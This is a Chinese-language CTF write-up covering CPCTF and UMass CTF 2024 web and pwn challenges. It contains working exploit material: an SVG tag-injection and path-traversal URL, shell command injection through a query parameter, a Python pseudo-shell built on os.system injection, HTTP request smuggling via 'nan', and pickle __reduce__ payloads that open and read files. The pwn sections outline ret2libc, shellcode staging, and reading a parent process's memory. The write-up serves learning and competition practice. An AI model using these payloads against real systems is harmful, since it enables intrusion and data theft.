# CPCTF (by traP from 東京工業大学) and UMass CTF 2024

CPCTF是一个日本学校社团办的个人赛，也欢迎校外注册参加。平台为自研，网站全部是日文的，题目非常入门向而且有一些OI向的题目，感觉不是特别典型的CTF，特别是Pwn没有难题，Web有唯一一道Hard难度题还挺有意思

UMass看起来是一个相对大型的比赛（两日赛），出题有海绵宝宝相关的neta，时间不多就只把pwn和web做了，感觉难度不高，相比GeekCon那次直击重点，这里题目分散注意力的部分比较多，但是考点都是相对简单的。

## (CPCTF) Web - OGOGPGOGO
本题给了源码，是一个nodejs express搭建的博客网站。网站实现了一个基于SVG的在线图片处理，具体来说：

1. 可以传入一个`title`参数，参与到后续处理中
```js
app.get('/ogp', async function (req, res) {
    try {
        const { title } = req.query;
```
2. 用satori库把一个json对象解析为SVG
```js
const svg = await satori(
        {
            type: 'div',
            props: {
                children: title,
                style: {
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    width: '100%',
                    height: '100%',
                    padding: '4em',
                    color: 'black', backgroundColor: 'white',
                    fontSize: '3em',
                    background: "linear-gradient(lightblue, pink)"
                },
            },
        },
        {
            width: "1200px",
            height: "630px",
            fonts: [
                {
                    name: 'genshin-gothic-bold',
                    data: fontArrayBuffer,
                    weight: 400,
                    style: 'normal',
                },
            ],
        }
    );
```
3. 用Resvg（一个rust库）把SVG渲染为PNG格式并输出返回。
```js
const renderer = new Resvg(svg, {
    fitTo: {
        mode: 'width',
        value: 1200,
    },
})
const buffer = await renderer.render();
return buffer.asPng();
```

最后，flag以图片形式位于`/flag.png`，因此需要一个路径穿越读取。

#### 漏洞分析

首先`express`的命令行参数是可以传入对象的，因为`express`默认命令行参数处理模块为`qs`，当启用`express.urlencoded({ extended: true })`时，支持使用`?a[b][c]=d`这样的语法进行嵌套式对象构造，所以本质上相当于`title`可以是任意json。

稍微了解一下satori库（需要看底层源码，特别是外部图片引用部分），可以知道，这个库可以用`img`或`image`标签引入图片，但是href只接受`data:`协议的静态图片数据，和`http/https`协议的图片资源（这里是用的前缀匹配），并且会试图用`fetch`把图片请求回来生成`data:`协议数据。另外nodejs的`fetch`是不接受从`http`到`file`协议的302跳转的。

另外对于大部分格式，satori会把请求来的图片资源转为base64编码格式。然而，根据[源码](https://github.com/vercel/satori/blob/main/src/handler/image.ts#L186)，如果我们以data协议提供SVG格式的图片，且显示指定编码不为base64，则satori会认为我们的SVG是明文编码，会直接嵌入在原始SVG里。

接下来看Resvg的处理。作为一个rust库，我们很难去真正读懂代码，但是我们仍然可以找到其关于SVG的外部数据引用的[处理规则](https://github.com/RazrFalcon/resvg/blob/master/crates/usvg/docs/spec.adoc#svg-element)，最重要的一条是，SVG中是不能包含其他SVG tag的，否则会被忽略。因此，直接在原始SVG中包含一个引用了根目录图片的SVG，是不可行的。

不过，考虑到satori对于声明为SVG格式的数据的处理，并不包含任何检查，我们可以构造病态输入截断`<image href="data:image/svg+xml;utf8,{data}"/>`这个XML tag，比如如果`data="/>{any tag}<image href="`，我们就截断了原来的tag而创造出了新的tag，这样我们就可以绕过satori的限制直接指定href为任何内容。

接下来我指定截断后的新image tag的href为`file:///flag.png`，发现还是没有成功读取。简单看了看Resvg并没有限制被读取图片路径的代码（和librsvg不同），于是我进行了`strace node test.js 2>test.log`这样的操作把系统调用hook出来，发现我竟然试图本地读取`/mnt/d/.../file:///flag.png`这个文件，看来Resvg默认引用图片全部来自本地文件系统而非在线资源，所以不会考虑URL scheme，因而我直接构造`../../../../../../flag.png`即可拿到嵌入了flag图片的图片

最终构造：
`https://ogogpgogo.web.cpctf.space/ogp?title[type]=img&title[props][width]=500&title[props][height]=500&title[props][src]=data:image/svg;utf8,%22/%3E%3Cimage%20href=%22../../../../../../flag.png%22%20width=%22500%22%20height=%22500%22%20/%3E%3Cimage%20href=%22`

## (以下均为UMASS CTF) web - Spongebobs Homepage 
web签到题。devtools发现网站有个`/assets/image?name=house&size=300x494`的请求，可以返回拉伸后的图片。修改`name`会导致404或400（如果包含`.`等，应该是黑名单过滤）。而当我设置`size=0x0`时，发现服务器没有返回图片而是返回了报错信息：
```html
<!-- 注意status_code仍然是200，说明请求了内网 -->
Server: SimpleHTTP/0.6 Python/3.10.14
Date: Mon, 22 Apr 2024 11:33:23 GMT
Connection: close
Content-Type: text/html;charset=utf-8
Content-Length: 566

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 500</p>
        <p>Message: Error resizing image: convert-im6.q16: negative or zero image size `./files/assets/house.png' @ error/resize.c/ResizeImage/2945.
.</p>
        <p>Error code explanation: 500 - Server got itself in trouble.</p>
    </body>
</html>
```

感觉`size`这个参数有说法，我大胆猜测size是以shell的形式传入的，尝试用`;`断开命令：`/assets/image?name=house&size=0x0;ls;`，发现没有报错但是浏览器无法正确显示，改用curl请求，发现命令执行了，于是`curl "$HOST/assets/image?name=house&size=0x0;cat+flag.txt;"`就拿到flag了。

## web - Crabby Clicker
这个题用go手搓了一个HTTP服务器，实现了一个非cookie的状态。具体来说，go程序里有一个全局变量`GLOBAL_STATE`，我们每访问一次`/click`，就会让`GLOBAL_STATE`加一，当`GLOBAL_STATE`为100时，访问`/flag`就能拿到flag。问题在于，没有cookie的情况下，每次请求之间都是不记录状态的。

我的解决方案是直接用pwntools手写HTTP报文，短时间内发送大量请求。源码中提到一个1s的timeout，那么我的理解是如果1s内发送多个请求，处理这些请求的进程应该是同一个，就共享全局变量。而如果超过1s，或者断开连接后再重新请求，处理请求的应该是fork出来的新进程，状态就丢失了。
```go
// Set a deadline for reading. If a second passes without reading any data, a timeout will occur.
r.conn.SetReadDeadline(time.Now().Add(1 * time.Second))
```
另外我写的时候虽然加上了`Connection: keep-alive`，但这个手搓的服务器肯定是不处理的。

## web - Holesome Birthday Party
我觉得也是签到题难度，类似之前某个比赛那个考headers的tutorial。唯一值得说的是有个`Date`的Header，提示文字印象中是`You are too early for birthday party`，但是需要查谷歌才知道海绵宝宝官宣的生日是7月14日，说实话有点脑筋急转弯/纯猜脑洞，没意思。

`curl -H "User-Agent: Bikini Bottom" -H "Date: Sun, 14 Jul 2024 05:28:07 GMT" -H "Accept-Language: fr" -H "Cookie: flavor=chocolate_chip; Login=eyJsb2dnZWRpbiI6IHRydWV9" http://holesomebirthdayparty.ctf.umasscybersec.org/ --verbose`

## web - Future Router
难度正常的简单题。网页说是一个路由器界面，有两个模块，分别是cURL模块，可以向内网发送请求，以及一个未知功能的`customer service`模块，似乎可以通过websocket向内网`localhost:1337/app`发送信息，但是返回的信息永远是`I could not understand your message, this agent is under construction. Please use the other implemented features for now!`

首先测试curl。题目界面给了三个内网地址，都是静态HTTP服务。通过一些fuzzing可以知道服务器本身开在`localhost:8000`和`localhost:1337`，没有更多信息。然后我本来都开始要写一个脚本扫端口了，猛然意识到是不是可以请求`file://`协议，一试果然可以，通过`file:///proc/self/cmdline`知道这个服务是`gunicorn`，那么通过`file:///proc/self/cwd/app.py`就可以获取源码，以及引用的其他代码相关的其他文件，其中最重要的文件是`/proc/self/cwd/karen/customerservice.py`，也就是那个未知的websocket服务。

其实这个ws服务本身内容很简单，它会对传入的字符串做一个cyclic xor，之后的内容处理方法如下：
```python
def handle_input(self,message):
    if ("hello" in message):
        return self.Dialogue["Welcome"]
    elif("krabby patty" in message):
        filtered_message = re.sub(r"(\"|\'|\;|\&|\|)","",message)
        os.system(f'echo "{filtered_message}\n" >> /dev/null')
        return self.Dialogue["Secret formula"]
    elif("problem" in message):
        return self.Dialogue["Problem"]
    else:
        return "I could not understand your message, this agent is under construction. Please use the other implemented features for now!"
```
很明显`krabby patty`分支是可以执行代码的，唯一问题是似乎没有回显，并且过滤了绝大多数分隔命令的字符，不过`$()`是没有被过滤的。关于回显，我的解决方案是重定向到`/tmp`下的文件里然后用curl的file协议读取。考虑到易用性我最终是写成了一个shell（注意websocket通信是asyncio的，需要包在async函数里）：

```py
async def contact_main():
    while True:
        async with websockets.connect(WS_HOST) as ws:
            cmd = input('$ ')
            if cmd == 'exit':
                await get_resp(ws,f'krabby patty $(rm /tmp/Lysithea)')
                break
            recv_text = await get_resp(ws,f'krabby patty $({cmd} >/tmp/Lysithea)')
        resp = s.post(CURL_HOST, json={"URL": f"file:///tmp/Lysithea"})
        print(resp.json()['success'])

asyncio.get_event_loop().run_until_complete(contact_main())
```

```sh
$ find / -name flag*
/flag53958e73c5ba4a66

$ ls /flag53958e73c5ba4a66
/flag53958e73c5ba4a66

$ cat /flag53958e73c5ba4a66   
UMASS{W3lC0m3_t0_Th3_FuTur3_Kr4bS_c28e1089b2}
```
## Web - Cash Cache
web压轴，三级Web服务器导致代码量很大，但理清后其实难度不高。核心考点是`float("nan")`和pickle反序列化。

首先简单介绍题目环境。

- 前端nginx服务，开在5000端口，没有特别配置，只是加上XFF/Host之类的Header
- 缓存：redis服务，没有特别配置
- 后端1：Python ForkingTCPServer，9000端口，手搓的服务端，会利用socket读取连接，解析成一个或数个HTTP请求，特别是包含一个`Cash-Encoding` header和后续报文处理。实现了一个缓存命中检查，如果没有命中会请求下一个后台
- 后端2：nodejs express，3000端口，包含两个endpoint，其中一个`POST /debug`的endpoint会检查nginx设置的XFF，如果是`127.0.0.1`的请求，则可以对redis服务端进行写操作。另外，nodejs服务端会设置一个名为`uid`的随机cookie，作为后续redis缓存的key。

这种多级的题目我发现在本地调试时，从最内层向外一层层调试比较快，因为一般来说外层的请求都是内层请求基础上加一个wrapper。然而分析程序逻辑时，还是得按时间顺序从外到里。

#### nginx
nginx是基础配置，主要作用还是加XFF头。这里只是专门提一下`Content-Length`这个头，这个头直接决定了nginx把多少body带进下一级请求里，和method无关，只要指定`Content-Length`，即使是`GET`请求也是可以带body的。

#### Python 请求解析，Cash-Encoding header
这个题服务端是直接读取TCP流量后进行的手动解析。提取请求头的部分非常规范没什么可说的，关键在于当存在`Cash-Encoding: Money!`这个header后，会把body传入`parseCash`函数做后处理：

```python
def parseHTTPReq(text:bytes) -> tuple[list[HTTPReq], float]:
    try:
        Requests = []
        stream_text = text.decode()
        spent = 0
        while (stream_text):
            cur, _, stream_text = stream_text.partition("\r\n")
            method, route, version = cur.split(' ')
            Headers = {}
            while (True):
                cur, _, stream_text = stream_text.partition("\r\n")
                if (cur == ''):
                    break
                key, _, val = cur.partition(':')
                Headers[key] = val.replace(' ', '')
            if ("Cash-Encoding" in Headers and Headers["Cash-Encoding"] == "Money!"):
                body, stream_text, spent = parseCash(stream_text)
            else:
                body = stream_text
                stream_text = ""
            Headers['Content-Length'] = len(body)
            req = HTTPReq(method, route, version, Headers, body)
            Requests.append(req)
        return Requests, spent
    except Exception as e:
        log(e)
        return None, None
```

这里其实有一个点很关键：express服务器在一次TCP连接中只会处理一个报文。这一点和之前做过的基于`fiber-go`的`webp-server-go`非常不一样，那个是连接不中断就可以发多个报文，这里似乎是只能发一个（可能和nginx自己加的`Connection: close` header有关）。

而不带`Cash-Encoding`时，`stream_text`会置空，也就不会有下一个报文了。之所以我们需要多个报文，是为了绕过nginx给我们加的XFF头，这样就能最终对nodejs的`/debug`进行POST，以控制redis缓存内容。为此我们需要让`parseCash`的第二个返回参数是我们需要的第二个报文。

```python
MINIMUM_CASH = 10000000.0

def parseCash(stream_text):
    spent = 0
    body = ""
    while (spent < MINIMUM_CASH):
        cur, _, stream_text = stream_text.partition("\r\n")
        amount, units = cur.split(' ')
        if (units == "DOLLARS"):
            amount = float(amount)
        elif (units == "CENTS"):
            amount = float(amount)/100
        else:
            raise Exception("I can't understand the units!")
        # Dear Reader,
        #   I wrote this Ternary Operator today because I learned it
        #   in boating school. For some reason it sometimes cuts off
        #   the end of requests. But it probably is not a big deal.
        # From,
        # Patrick Star
        index = round(amount) if amount <= len(
            stream_text) else len(stream_text) - len(cur)
        cur = stream_text[:index]
        stream_text = stream_text[index:]
        if (len(cur) < amount or amount < 0):
            raise Exception("Are you trying to steal from me?")
        spent += amount
        body += cur
    return body, stream_text, spent
```

这段逻辑非常迷惑，那个`index = round(amount) if amount <= len(stream_text) else len(stream_text) - len(cur)`尤其是完全看不懂是在干嘛。不过后面的`len(cur) < amount or amount < 0`其实是个很严格的判断，它几乎要求我们的`amount`必须是一个小于报文长度的正数，但与此同时，为了跳出循环，我们的`amount`加起来又需要大于`MINIMUM_CASH`，考虑到一次TCP连接最多读取4096字节，这几乎是不可能的。

但是，假如我们传入`nan DOLLARS`，所有逻辑全部都能bypass。这主要是因为所有报错/留在循环内都要求和amount的逻辑表达式返回True，而`nan`的几乎所有逻辑表达式都会返回False。特别是，虽然`round(nan)`会报错，但是三目运算符会导致一定返回的是后面那个结果。经过一些调试，我们会发现，第二个报文的长度基本就等于`nan DOLLARS`前面这个`nan`的长度，我们可以无限插入`\r`这种空白字符，比如`float('nan' + '\r' * 100)`仍然能解析成功。最终传入这个函数的报文大致需要是这样的：

```python
money_body =  \
f"""{'nan'.ljust(len(sneak_body) - 8, chr(0xd))} DOLLARS\r
{sneak_body}"""
```

其中`sneak_body`是一个完整的HTTP报文。

#### 缓存机制
redis可以理解为一个远程的字典。这个题不涉及redis本身的权限等安全问题，所以我们重点关注写入、读取redis条目的时机：

在Python后端，涉及对redis写入的代码：
```python
UID = resp.headers['X-Cache-UID']
if (REDIS_CLIENT.exists(UID)):
    cash_elem:CashElement = pickle.loads(
        base64.b64decode(REDIS_CLIENT.get(UID)))
    cash_elem.spent += spent
    cash_elem.set_resp(request.route, resp)
    REDIS_CLIENT.set(UID, base64.b64encode(
        pickle.dumps(cash_elem)))
else:
    cash_elem = CashElement()
    cash_elem.spent += spent
    cash_elem.set_resp(request.route, resp)
    REDIS_CLIENT.set(UID, base64.b64encode(
        pickle.dumps(cash_elem)))
```
我们可以看到写入的是一个`CashElement`对象的pickle的base64。涉及到的类定义：
```python
class HTTPResp:
    def __init__(self, version, status_code, reason, headers, body):
        self.version = version
        self.status_code = status_code
        self.reason = reason
        self.headers = headers
        self.body = body

    def get_raw_resp(self):
        header_string = ""
        for key in self.headers.keys():
            header_string += f"{key}:{self.headers[key]}\r\n"
        return f"{self.version} {self.status_code} {self.reason}\r\n".encode() + header_string.encode() + b"\r\n" + self.body


class CashElement:
    def __init__(self):
        self.resps = {}
        self.spent = 0

    def set_resp(self, route, cached):
        self.resps[route] = cached

    def get_resp(self, route):
        return self.resps[route] if route in self.resps else None
```
所以这个`CashElement`里面核心就是`resps`这个字典，key是endpoint，value则是一个封装好的`HTTPResp`对象，包含了版本/响应码/响应头/响应体等信息，并可以调用`get_raw_resp`返回完整的响应报文。

再看读取缓存的部分：
```python
RESP = b""
for request in http_reqs:
    cookies = request.get_cookies()
    if (cookies and 'uid' in cookies and REDIS_CLIENT.exists(cookies['uid'])):
        cash_elem:CashElement = pickle.loads(base64.b64decode(
            REDIS_CLIENT.get(cookies['uid'])))
        cached = cash_elem.get_resp(request.route)
        if (cached):
            cached.headers['X-Cache-Hit'] = "HIT!"
            cached.headers['X-CashSpent'] = cash_elem.spent
            cached.headers['X-CachedRoutes'] = len(cash_elem.resps)
            RESP += cached.get_raw_resp()
            continue
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("localhost", 3000))
    raw_req = request.get_raw_req()
    sock.sendall(raw_req.encode())
    raw_data = sock.recv(4096)
    while (raw_data != b''):
        RESP += raw_data
        raw_data = sock.recv(4096)
    sock.close()
resp = parseHTTPResp(RESP)
```
只要我们设置了`uid` cookie就会尝试读取缓存，pickle反序列化后，再查询`resps`中有没有我们请求的这个endpoint，如果命中了就直接返回缓存中的响应体，否则再对nodejs（localhost:3000）发起请求。

nodejs中，`/debug`修改redis的部分：
```js
app.post('/debug', async (req, res) => {
    console.log(req.body)

    const IPS = req.headers['x-forwarded-for']
        .split(',')
        .map(ip => ip.trim());
    // Developers will be forwarded from
    // the krusty krab proxy otherwise 
    // nginx will be the client ip
    const clientIP = IPS.pop();
    if (clientIP == '127.0.0.1') {
        console.log(req.body)
        const UID = req.body.uid ? req.body.uid : undefined;
        const DATA = req.body.data ? req.body.data : undefined;
        if (UID && DATA) {
            const uid_exists = await client.exists(UID);
            if (uid_exists) {
                await client.set(UID, DATA);
                return res.json({ 'success': `Set the entry for ${UID} to "${DATA}"` });
            }
        }
        return res.json({ 'error': `Expected valid uid and data but got ${UID} and ${DATA}` })
    }
    res.status(403).json({ 'error': 'This is only reachable from within the network!' });
})
```
这里直接把`req.body`作为一个对象了，经过尝试后发现这需要在请求头里指定`Content-Type: application/json`，然后body直接传json。Docker自己的log可以很容易地记录。

#### pickle反序列化
到这里我们已经可以控制redis返回任意pickle了，接下来我们要利用这个进行文件读取。

pickle实际上是一个基于栈的编程语言，有自己的字节码。传统的pickle反序列化核心在于`__reduce__`。这个函数声明了当一个对象被反序列化复原时应该进行什么操作，特别是可以指定在被反序列化的环境下没有这个类的情况下，pickle会被还原成什么样子。为了达成这一点，需要在序列化（dump）过程中把`__reduce__`内容转换为字节码并保存，在反序列化（load）的过程直接执行。也就是说，我们在本地写一个`__reduce__`，远端即使没有`__reduce__`也会执行写好我们的代码。最基础的用法是让它返回一个二元素元组：
```python
class A:
    def __reduce__(self):
        return (os.system, ("ls /", ))
```
那么假如我们把`A()`序列化后，反序列化时，会执行`os.system("ls /")`，**然后A()会等于这个函数的返回值，也就是0，而并非是一个`class A`的对象**（这一点很多教程不会提）。实际上`__reduce__`的返回值最多可以是一个五元素元组，第三个元素会被`__setstate__`调用还原对象内部状态（可以看`__getstate__`返回值，是一个字典），第四五个元素分别对应构造函数需要的`*args`和`**kwargs`的生成器。

看起来这个`__reduce__`并不是很灵活，不能保留内部状态，不过我最终还是找到了不需要状态就能读取文件的方式，用`os.open`和`os.read`直接对文件操作符打开和读取：

```python
class CashElement:
    def __init__(self):
        self.resps = {}
        self.spent = 0

    def set_resp(self, route, cached):
        self.resps[route] = cached

    def get_resp(self, route):
        return self.resps[route] if route in self.resps else None


class evil_bytes(str):
    def __reduce__(self):
        # fd is set after first response (after we know the opened fd)
        return (os.read, (6, 0x100))
    
class evil_open(str):
    def __reduce__(self):
        return (os.open, ("/flag.txt", 0))


class HTTPResp:
    def __init__(self, version, status_code, reason, headers, body):
        self.version = version
        self.status_code = status_code
        self.reason = reason
        self.headers = headers
        self.body = body

    def get_raw_resp(self):
        header_string = ""
        for key in self.headers.keys():
            header_string += f"{key}:{self.headers[key]}\r\n"
        return f"{self.version} {self.status_code} {self.reason}\r\n".encode() + header_string.encode() + b"\r\n" + self.body
    
    def __reduce__(self):
        return (self.__class__, ('HTTP/1.1', '777', 'PWNED!!', {"fd": evil_open(), "content": evil_bytes()}, b'123'))

# generate pickle
evil_cash = CashElement()
evil_resp = HTTPResp('HTTP/1.1', '777', 'PWNED!!', {}, b'hahahahaha')
print(evil_resp.get_raw_resp())
evil_cash.set_resp('/flag', evil_resp)

print(evil_cash.__getstate__())

evil_pkl = pickle.dumps(evil_cash, protocol=0)
```

在本地`evil_open`和`evil_read`类就是`str`的子类，所以`evil_open(), evil_read()`都会返回空字符串。但是在序列化过程中，因为我们定义了`__reduce__`，所以服务端不仅不会保留`evil_open`, `evil_read`这两个类，而且会用我们在`__reduce__`里定义的行为还原这两个对象。最终造成的效果是，我们第一次请求可以在`fd`头里看到被打开的操作符，然后第二次请求里可以在`content`头里看到flag了。

[exp](cashcache/req.py)

最后提一下，`__reduce__`可以被限制绕过的，一般需要手写pickle。根据[这篇博客](https://xz.aliyun.com/t/11807)的说法，现有的已经有反序列化中禁用`__reduce__`等解析后仍然可以绕过的手段了，甚至可以手写/借用工具写RCE。Pickle本身也是一门基于栈的语言，可以玩出很多花样。

## pwn - mitigation
给源码的pwn，有两个文件。一开始我看到wrapper.c里面有一堆ptrace还感觉不妙，结果`wrapper`只是辅助文件，不会影响程序执行，所以我们直接调试`chall`文件就好了

这个题类似笔记管理系统。但是只有add, edit, resize三个选项，其中`resize`是realloc操作，特定大小下可以等效于free后malloc。而edit的大小完全由自己指定，程序没有存储，因此可以随意越界写。我们的目标是要某次`malloc`后得到的堆块内容为`Ez W`，这只需要让它在tcache里面被UAF就行了。

## pwn - bench-225
这个题也是有很多干扰的部分。核心是我们要进入一个`motivation`函数（简单逆向一下很容易进），这里面就直接是一个简单粗暴的栈溢出+格式化字符串漏洞，而且可以无限次使用。所以先泄露canary/PIE/LIBC地址然后ret2libc就完事了。

## pwn - red40
是压轴题，本来以为是个玩多进程ptrace的很难，结果其实没有想象中难。

这个题环境是在一个chroot jail下的，父进程fork出子进程，flag在父进程的堆上，我们只能和子进程交互。子进程有`seccomp`，限制了`execve, execveat, socket`。

这个题给了很多模块，其中一个模块`warn`里面包含了一个`printf`（可以泄露两个地址，刚好PIE + LIBC，这个题没有canary）和一个栈上的`gets`，所以这一步可以直接劫持流程。有另一个模块通过多次随机可以以1/40概率拿到`PPID`，可随机的最大次数还可以通过一个整数溢出来无限增加，但是我都劫持程序流了还会差这一个PPID吗。

为了后面方便，我先调用`mprotect`在BSS上开了一段RWX的内存区域，把我的shellcode用`gets`读取上去，再直接ROP过去，就不用四处找gadget了。这里提一个小插曲，就是我发现远程和我LIBC一致，但是PIE不一致，原因只能是远程的ELF程序和我这里不一样，不过我的gadget都是LIBC上的，通过把程序本体`write`出来的方式我还是找到了BSS段和RODATA段，找到了BSS上一段空闲的内存区域。

我看到`nsjail.cfg`配置文件以为没有`/proc`文件系统，然后尝试用ptrace连接父进程，在`PTRACE_GETREGS`时一直返回-14（但文档上失败是返回-1，很迷）。但实际上子进程初始化时就读取并检查了`/proc/sys/kernel/yama/ptrace_scope`的内容不为1。这个文件为0是传统权限管理，任何进程都可以读其他非root进程的proc文件系统。所以我们先从`/proc/[ppid]/maps`拿到偏移然后读取`/proc/[ppid]/mem`中的堆地址即可。结果这个题成了一个无聊的ORW题，没什么意思了。

[exp](red40/exp.py)